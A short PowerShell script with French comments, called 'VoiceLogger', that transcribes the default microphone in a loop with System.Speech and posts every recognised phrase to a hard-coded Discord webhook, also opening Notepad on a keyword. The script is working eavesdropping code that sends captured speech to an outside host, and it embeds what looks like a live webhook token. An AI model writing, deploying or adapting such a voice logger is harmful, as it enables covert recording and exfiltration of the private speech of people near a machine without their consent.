# Charger la bibliothèque .NET pour la reconnaissance vocale
Add-Type -AssemblyName System.Speech

# Définir la reconnaissance vocale
$recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
$recognizer.LoadGrammar((New-Object System.Speech.Recognition.DictationGrammar))
$recognizer.SetInputToDefaultAudioDevice()

# Webhook Discord
$webhookUrl = "https://discord.com/api/webhooks/1308071622107725864/6B8Mr1HFx82ZFvXwmjAZ2liEMkeiZe7G_LM7xLJZxiyUj7aSWcUL-1S18qKWLd2CYVji"

# Fonction pour envoyer un message au webhook Discord
Function Send-ToDiscord {
    param (
        [string]$content
    )
    $body = @{content = $content} | ConvertTo-Json -Depth 1
    Invoke-RestMethod -Uri $webhookUrl -Method POST -ContentType 'application/json' -Body $body
}

# Fonction principale
Function Start-VoiceLogger {
    Write-Host "VoiceLogger démarré... Appuyez sur Ctrl+C pour arrêter."
    try {
        while ($true) {
            $result = $recognizer.Recognize()
            if ($result) {
                $text = $result.Text
                Write-Host "Texte détecté : $text"

                # Envoyer le texte détecté à Discord
                Send-ToDiscord -content $text

                # Gestion des commandes spécifiques
                if ($text -match "notepad") {
                    Start-Process notepad
                }
                elseif ($text -match "exit") {
                    Write-Host "Arrêt du VoiceLogger..."
                    break
                }
            }
        }
    }
    catch {
        Write-Host "Erreur : $($_.Exception.Message)"
    }
    finally {
        $recognizer.Dispose()
    }
}

# Démarrage du VoiceLogger
Start-VoiceLogger
